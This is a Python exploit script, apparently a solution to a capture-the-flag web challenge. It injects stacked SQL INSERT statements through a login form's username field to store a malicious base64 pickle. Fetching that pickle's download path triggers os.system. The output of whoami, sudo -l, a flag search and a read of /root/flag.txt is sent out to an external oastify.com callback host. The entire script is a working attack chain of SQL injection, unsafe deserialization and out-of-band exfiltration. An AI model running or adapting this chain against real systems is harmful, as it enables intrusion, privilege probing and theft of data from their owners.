import requests
import pickle
import base64
import os
import uuid

host = "challenge.ctf.games"
port = 30374

headers = {
    'Host': f'{host}:{port}',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def find_flag():

    base_command = "python3 -c \"import http.client; conn = http.client.HTTPSConnection('1xzoulrf4125wo81b9sd246nfd6ieqjc5123ai16suh.oastify.com'); conn.request('GET', '/$(__COMMAND__|base64 -w0)'); print(conn.getresponse().read())\""
    command_whoami = base_command.replace("__COMMAND__", "whoami") 
    command_sudo_l = base_command.replace("__COMMAND__", "sudo -l")
    command_find_flag = base_command.replace("__COMMAND__", "sudo find / -name flag.txt 2>/dev/null")
    command_cat_flag = base_command.replace("__COMMAND__", "sudo cat /root/flag.txt")
    for command in [command_whoami, command_sudo_l, command_find_flag, command_cat_flag]:

        class RCE:
                def __reduce__(self):
                    return os.system, (command,)
    
        pickled = pickle.dumps(RCE())
        rcepayload = base64.b64encode(pickled).decode("utf-8")
        filename = uuid.uuid4()
        payload = f"username=\\;INSERT%0Ainto+`activesessions`(sessionid,timestamp)VALUES(\\1\\,\\2024-10-19%2018:12:48.163411\);INSERT%0AINTO%0Afiles%0A(filename,data,sessionid)%0AVALUES(\\{filename}\,\\{rcepayload}\\,\\2024-10-19%2018:12:48.163411\\);--&password=asds"

        stage1_response = requests.post(
             f"http://{host}:{port}/login",
             headers=headers,
             data=payload,
             allow_redirects=False
             )

        if stage1_response.status_code != 302:
            print(f"[-] Error in stage1: status {stage1_response.status_code}")

        stage2_response = requests.get(
            f"http://{host}:{port}/download/{filename}/1",
            headers=headers,
            allow_redirects=False
        )

        if stage2_response.status_code != 302 or stage2_response.headers["Location"] != f"http://{host}:{port}/files":
            print(f'[-] Error in stage2: status {stage2_response.status_code} - Headers: {stage2_response.headers}')
            
find_flag()